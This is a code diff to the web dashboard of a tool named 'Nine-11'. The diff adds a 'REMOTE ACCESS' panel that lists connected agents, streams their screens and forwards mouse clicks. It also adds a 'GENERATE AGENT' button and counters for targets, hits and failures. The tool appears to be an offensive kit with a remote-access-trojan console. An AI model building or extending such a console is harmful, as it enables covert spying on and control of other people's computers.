@@ -248,8 +248,9 @@
             +Nine-11 <span style="font-size: 0.7rem; color: #555;">v2.0.0-PRO</span>
         </div>
         <div class="status-indicators">
-            <div class="status-item">NET: <span id="ind-net">STABLE</span></div>
-            <div class="status-item">SIG: <span id="ind-sig">ENCRYPTED</span></div>
+            <div class="status-item">TARGETS: <span id="global-targets">0</span></div>
+            <div class="status-item">TOTAL HITS: <span id="global-hits" style="color: var(--success);">0</span></div>
+            <div class="status-item">TOTAL FAIL: <span id="global-fails" style="color: var(--danger);">0</span></div>
             <div class="status-item">CPU: <span id="ind-cpu">0.1%</span></div>
         </div>
         <div>
@@ -272,6 +273,9 @@
             </div>
             <div class="nav-item" data-tab="tab-osint">
                 <i class="bi bi-search"></i> INTEL INQUIRY
+            </div>
+            <div class="nav-item" data-tab="tab-remote">
+                <i class="bi bi-display"></i> REMOTE ACCESS
             </div>
         </aside>
 
@@ -428,6 +432,41 @@
                 </div>
             </div>
 
+            <!-- REMOTE ACCESS MODULE -->
+            <div id="tab-remote" class="module-tab">
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">Remote Administration Console</div>
+                        <span class="badge bg-danger">LIVE CONTROL</span>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-4">
+                            <label class="form-label">Connected Agents</label>
+                            <div id="client-list" class="list-group bg-dark border border-dark" style="max-height: 400px; overflow-y: auto;">
+                                <div class="text-center p-3 text-muted">No agents online</div>
+                            </div>
+                        </div>
+                        <div class="col-md-8">
+                            <label class="form-label">Live Viewport</label>
+                            <div id="remote-viewport-container" class="border border-dark bg-black d-flex align-items-center justify-content-center overflow-hidden" style="height: 400px; position: relative;">
+                                <img id="remote-screen" style="max-width: 100%; max-height: 100%; cursor: crosshair;">
+                                <div id="no-client-overlay" class="text-muted">Select an agent to start monitoring</div>
+                            </div>
+                        <div class="mt-2 d-flex justify-content-between align-items-center">
+                                <div class="text-muted" style="font-size: 0.7rem;" id="agent-info">NO ACTIVE SESSION</div>
+                                <div>
+                                    <button class="btn btn-sm btn-outline-info me-2" onclick="window.location.href='/remote/generate'">
+                                        <i class="bi bi-download"></i> GENERATE AGENT
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger" id="btn-stop-monitoring" style="display: none;" onclick="stopMonitoring()">STOP SESSION</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
         </main>
 
         <div class="terminal-container" id="terminal">
@@ -449,9 +488,92 @@
     <canvas id="particle-canvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1001;"></canvas>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
+        const socket = io();
         let currentStatusInterval = null;
         let activeLinkID = null;
+        let selectedAgentSid = null;
+
+        // --- Socket Events ---
+        socket.on('live_stats', (data) => {
+            document.getElementById('global-hits').innerText = data.hits;
+            document.getElementById('global-fails').innerText = data.fails;
+            document.getElementById('global-targets').innerText = data.targets;
+            if (data.active) {
+                document.getElementById('ind-cpu').innerText = '0.5% (LOAD)';
+            } else {
+                document.getElementById('ind-cpu').innerText = '0.1% (IDLE)';
+            }
+        });
+
+        socket.on('client_list', (clients) => {
+            updateClientList(clients);
+        });
+
+        socket.on('display_frame', (data) => {
+            if (data.frame) {
+                document.getElementById('remote-screen').src = 'data:image/jpeg;base64,' + data.frame;
+            }
+        });
+
+        function updateClientList(clients) {
+            const list = document.getElementById('client-list');
+            if (clients.length === 0) {
+                list.innerHTML = '<div class="text-center p-3 text-muted">No agents online</div>';
+                return;
+            }
+            list.innerHTML = '';
+            clients.forEach(client => {
+                const item = document.createElement('div');
+                item.className = 'list-group-item list-group-item-action bg-dark text-white border-dark d-flex justify-content-between align-items-center';
+                item.style.cursor = 'pointer';
+                item.innerHTML = `
+                    <div>
+                        <div style="font-weight: bold; color: var(--accent);">${client.hostname}</div>
+                        <div style="font-size: 0.7rem; color: var(--text-muted);">${client.ip} | ${client.os}</div>
+                    </div>
+                    <span class="badge bg-success rounded-pill">ONLINE</span>
+                `;
+                item.onclick = () => startMonitoring(client);
+                list.appendChild(item);
+            });
+        }
+
+        function startMonitoring(client) {
+            selectedAgentSid = client.sid;
+            socket.emit('admin_join', { target_sid: client.sid });
+            document.getElementById('no-client-overlay').style.display = 'none';
+            document.getElementById('btn-stop-monitoring').style.display = 'block';
+            document.getElementById('agent-info').innerText = `SESSION: ${client.hostname} (${client.sid})`;
+            addLog(`CONNECTING TO AGENT: ${client.hostname}...`, 'info');
+        }
+
+        function stopMonitoring() {
+            selectedAgentSid = null;
+            document.getElementById('remote-screen').src = '';
+            document.getElementById('no-client-overlay').style.display = 'block';
+            document.getElementById('btn-stop-monitoring').style.display = 'none';
+            document.getElementById('agent-info').innerText = 'NO ACTIVE SESSION';
+            addLog("REMOTE SESSION TERMINATED.", 'warning');
+        }
+
+        // --- Mouse Input Forwarding ---
+        document.getElementById('remote-screen').addEventListener('mousedown', (e) => {
+            if (!selectedAgentSid) return;
+            const rect = e.target.getBoundingClientRect();
+            // Get original image dimensions if possible, otherwise use scaling
+            // The image is scaled down to 800x600 in agent.py
+            const x = (e.clientX - rect.left) / rect.width * 800; // Normalizing to our capture resolution
+            const y = (e.clientY - rect.top) / rect.height * 600;
+            
+            socket.emit('admin_input', {
+                target_sid: selectedAgentSid,
+                type: 'click',
+                x: Math.round(x),
+                y: Math.round(y)
+            });
+        });
 
         // --- Navigation ---
         document.querySelectorAll('.nav-item').forEach(item => {
